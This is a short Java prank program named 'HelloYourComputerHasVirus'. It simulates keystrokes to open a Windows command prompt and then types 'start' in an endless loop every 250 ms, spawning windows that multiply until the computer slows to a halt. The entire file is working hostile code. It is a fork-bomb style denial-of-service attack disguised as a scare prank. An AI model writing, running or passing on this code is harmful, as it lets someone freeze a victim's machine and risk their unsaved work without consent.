package bin.bullshit;

import lib.AutoMat;

import java.awt.event.KeyEvent;

public class HelloYourComputerHasVirus {
    public static void main(String[] args) throws InterruptedException {


        AutoMat.pressKey(new int[]{KeyEvent.VK_WINDOWS, KeyEvent.VK_R});
        Thread.sleep(25);
        AutoMat.type(new int[]{KeyEvent.VK_C, KeyEvent.VK_M, KeyEvent.VK_D, KeyEvent.VK_ENTER}, 25);

        while (true) {

            Thread.sleep(250);
            AutoMat.type(new int[]{KeyEvent.VK_S, KeyEvent.VK_T, KeyEvent.VK_A, KeyEvent.VK_R, KeyEvent.VK_T, KeyEvent.VK_ENTER}, 25);

        }


    }
}